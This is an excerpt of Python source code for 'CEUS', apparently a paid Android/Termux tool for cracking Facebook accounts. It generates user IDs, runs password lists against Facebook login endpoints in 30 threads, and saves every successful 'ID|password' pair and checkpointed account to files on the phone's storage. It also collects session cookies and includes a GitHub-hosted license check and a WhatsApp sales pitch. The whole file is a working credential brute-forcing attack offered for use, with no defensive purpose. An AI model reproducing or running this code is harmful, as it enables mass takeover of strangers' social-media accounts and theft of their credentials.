...
░╚════╝░╚══════╝░╚═════╝░╚═════╝░
=======================================================
\033[;37m\033[;97m         Facebook       \033[;37m\033[;92m  : CEUS
...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://raw.githubusercontent.com/raynonchalant/Approved/main/Approved.txt').text
    if id in httpCaht:
...
def login():
        ...
        try:
                ...
                os.system('rm -rf .ceus.txt');time.sleep(1);login()
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        linex()
                        tks = ("Hi ceus Sir, I Need To Buy Your Paid CEUS PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python ceus.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as ceus:     
                        clear()
                        tl = str(len(user))
...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        ceus=session.cookies.get_dict().keys()
                        if "c_user" in ceus:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m CEUS-OK %s | %s'%(ids,pas))
                                open('/sdcard/CEUS-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in CEUS:
                                if 'y' in pcp:
                                        print('\r\033[1;97m CEUS-CP '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/CEUS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m CEUS-OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/CEUS-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32mCEUS-OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/CEUS-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/CEUS-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m CEUS-OK '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/CEUS-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32mCEUS-OK '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/CEUS-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
